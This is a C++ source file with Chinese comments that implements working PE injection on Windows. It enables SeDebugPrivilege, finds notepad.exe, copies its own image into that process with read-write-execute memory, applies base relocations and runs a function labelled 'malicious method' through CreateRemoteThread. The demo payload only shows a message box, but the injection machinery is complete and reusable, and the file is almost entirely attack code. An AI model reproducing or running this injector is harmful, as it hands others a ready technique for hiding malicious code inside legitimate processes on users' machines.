#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

using namespace std;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
// 恶意方法
DWORD InjectionEntryPoint()
{
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
    return 0;
}

BOOL PrivilegeEscalation()
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;
    if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    else {
        cout << "[+]提权成功" << endl;
        return TRUE;
    }
}

DWORD GetProcessPID(LPCSTR lpProcessName)
{
    DWORD rPid = 0;
    // 初始化结构体信息，用于枚举进程
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE lpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (lpSnapshot == INVALID_HANDLE_VALUE) { cout << "[-]创建快照失败" << endl; return 0; }
    if (Process32First(lpSnapshot, &processEntry)) {
        do {
            if (lstrcmp(processEntry.szExeFile, lpProcessName) == 0) {
                rPid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(lpSnapshot, &processEntry));
    }
    CloseHandle(lpSnapshot);
    cout << "[*]PID: " << rPid << endl;
    return rPid;
}

int main()
{
    LPCSTR name = "notepad.exe";
    // 提升当前进程权限
    if (!PrivilegeEscalation()) { cout << "[-]提升权限失败" << endl; return 1; }

    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dosHeader->e_lfanew);

    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    DWORD Pid = GetProcessPID(name);
    if (Pid == 0) { cout << "[-]获取PID失败" << endl; return 1; }
    HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, Pid);
    if (hProcess == INVALID_HANDLE_VALUE) { cout << "[-]打开进程失败" << endl; return 1; }

    PVOID tarImageBase = VirtualAllocEx(hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR offset = (DWORD_PTR)tarImageBase - (DWORD_PTR)imageBase;
    cout << "[*]tarImageBase: " << tarImageBase << endl;
    cout << "[*]localImage: " << localImage << endl;
    cout << "[*]Offset: " << hex << offset << endl;

    //获取重定位表
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocationEntriesCount = 0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    //遍历重定位块
    while (relocationTable->SizeOfBlock > 0)
    {
        // 获取重定位块中包含的重定位项的数量
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (short i = 0; i < relocationEntriesCount; i++)
        {
            if (relocationRVA[i].Offset)
            {
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += offset;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    WriteProcessMemory(hProcess, tarImageBase, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
    //memset(localImage, 0, ntHeader->OptionalHeader.SizeOfImage);
    VirtualFree(localImage, 0, MEM_RELEASE);

    // 本地InjectionEntryPoint + offset = 远程InjectionEntryPoint
    HANDLE hRemoteHandle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + offset), NULL, 0, NULL);
    if (hRemoteHandle == INVALID_HANDLE_VALUE) { cout << "[-]创建远程线程失败" << endl; return 1; }
    WaitForSingleObject(hRemoteHandle, INFINITE);
    CloseHandle(hRemoteHandle);

    return 0;
}